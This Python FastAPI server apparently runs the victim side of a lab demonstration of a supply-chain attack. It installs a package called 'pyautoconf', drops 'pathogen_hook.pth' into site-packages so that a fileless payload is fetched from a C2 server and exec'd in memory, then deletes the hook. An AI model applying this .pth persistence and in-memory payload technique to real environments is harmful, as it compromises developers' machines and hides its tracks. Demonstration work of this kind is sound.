"""Victim container control server.

Exposes endpoints for the dashboard to trigger the attack sequence and
monitor status. Runs as the main process in the victim container.
"""
from __future__ import annotations

import asyncio
import json
import os
import shutil
import subprocess
import sys
import time
from urllib.request import Request, urlopen

from fastapi import FastAPI
from fastapi.responses import JSONResponse

app = FastAPI()

ATTACK_STATE = {"status": "idle", "log": []}
DASHBOARD_URL = os.environ.get("DASHBOARD_URL", "http://dashboard:8000")

SITE_PKG = None


def _get_site_packages() -> str:
    global SITE_PKG
    if SITE_PKG is None:
        SITE_PKG = subprocess.run(
            [sys.executable, "-c", "import site; print(site.getsitepackages()[0])"],
            capture_output=True, text=True,
            env={**os.environ, "_PTH_GUARD": "1"},
        ).stdout.strip()
    return SITE_PKG


def _report(event_type: str, data: dict) -> None:
    payload = json.dumps({
        "type": event_type,
        "data": data,
        "timestamp": time.time(),
        "source": "victim-1",
    }).encode()
    req = Request(
        f"{DASHBOARD_URL}/api/events",
        data=payload,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        urlopen(req, timeout=3)
    except Exception:
        pass


def _log(msg: str) -> None:
    ATTACK_STATE["log"].append(msg)
    _report("victim_log", {"message": msg})


def _poll_for_event(event_type: str, source: str = "victim-1", timeout: int = 120) -> bool:
    """Poll the dashboard for a specific event type from a specific source."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        time.sleep(2)
        try:
            resp = urlopen(f"{DASHBOARD_URL}/api/events/history", timeout=3)
            data = json.loads(resp.read())
            for evt in reversed(data.get("events", [])):
                if evt.get("type") == event_type and evt.get("source", "") == source:
                    return True
        except Exception:
            pass
    return False


def _cleanup_pth() -> None:
    """Remove the .pth file to prevent re-triggers."""
    pth_path = os.path.join(_get_site_packages(), "pathogen_hook.pth")
    if os.path.exists(pth_path):
        os.remove(pth_path)


def _run_attack() -> None:
    ATTACK_STATE["status"] = "running"
    _log("Attack sequence initiated")

    # Stage 0: Install the malicious package
    _report("stage_change", {"stage": 0, "label": "Installing Package"})
    _log("Running: pip install pyautoconf from local registry...")

    guarded_env = {**os.environ, "_PTH_GUARD": "1"}
    result = subprocess.run(
        [
            sys.executable, "-m", "pip", "install",
            "--index-url", "http://registry:8080/simple/",
            "--trusted-host", "registry",
            "--no-deps",
            "pyautoconf",
        ],
        capture_output=True, text=True, timeout=60, env=guarded_env,
    )
    _log(f"pip stdout: {result.stdout.strip()}")
    if result.returncode != 0:
        _log(f"pip stderr: {result.stderr.strip()}")
        ATTACK_STATE["status"] = "error"
        return

    import glob as _glob
    site_pkg = _get_site_packages()
    for pth in _glob.glob(os.path.join(sys.prefix, "pathogen_hook.pth")):
        dest = os.path.join(site_pkg, os.path.basename(pth))
        shutil.move(pth, dest)
        _log(f"Moved {pth} -> {dest}")

    _log("Package installed. pathogen_hook.pth deployed to site-packages.")

    # Trigger the .pth -- fileless payload fetched from C2 and exec'd in memory
    _report("stage_change", {"stage": "trigger", "label": ".pth Trigger (fileless)"})
    _log("Triggering site.py -> pathogen_hook.pth -> C2 fetch -> exec() in memory")

    clean_env = {k: v for k, v in os.environ.items() if k != "_PTH_GUARD"}
    clean_env["PAYLOAD_SOURCE"] = "victim-1"

    # Use Popen (non-blocking) so we can immediately clean up the .pth
    proc = subprocess.Popen(
        [sys.executable, "-c", "print('Hello from victim')"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        env=clean_env,
    )

    # Remove .pth immediately so healthchecks don't re-trigger it
    time.sleep(1)
    _cleanup_pth()
    _log(".pth cleaned up (payload already running in memory)")

    # Wait for the payload process to finish
    stdout, stderr = proc.communicate(timeout=120)
    _log(f"Trigger stdout: {stdout.decode().strip()}")
    if stderr.strip():
        _log(f"Trigger stderr: {stderr.decode().strip()}")

    _log("Waiting for payload completion signal...")

    if _poll_for_event("payload_complete", source="victim-1", timeout=120):
        _log("Payload reported completion")
    else:
        _log("Timed out waiting for payload — check dashboard for partial results")

    ATTACK_STATE["status"] = "complete"
    _report("attack_complete", {"message": "Full attack chain executed"})


@app.get("/health")
async def health():
    return {"status": "ok", "attack_state": ATTACK_STATE["status"]}


@app.post("/attack/start")
async def attack_start():
    if ATTACK_STATE["status"] == "running":
        return JSONResponse({"error": "Attack already running"}, status_code=409)

    ATTACK_STATE["status"] = "starting"
    ATTACK_STATE["log"] = []

    loop = asyncio.get_event_loop()
    loop.run_in_executor(None, _run_attack)

    return {"status": "started"}


@app.post("/attack/reset")
async def attack_reset():
    ATTACK_STATE["status"] = "idle"
    ATTACK_STATE["log"] = []

    site_pkg = _get_site_packages()
    for f in ["pathogen_hook.pth"]:
        path = os.path.join(site_pkg, f)
        if os.path.exists(path):
            os.remove(path)

    subprocess.run(
        [sys.executable, "-m", "pip", "uninstall", "-y", "pyautoconf"],
        capture_output=True, env={**os.environ, "_PTH_GUARD": "1"},
    )

    return {"status": "reset"}


@app.get("/attack/log")
async def attack_log():
    return {"log": ATTACK_STATE["log"], "status": ATTACK_STATE["status"]}
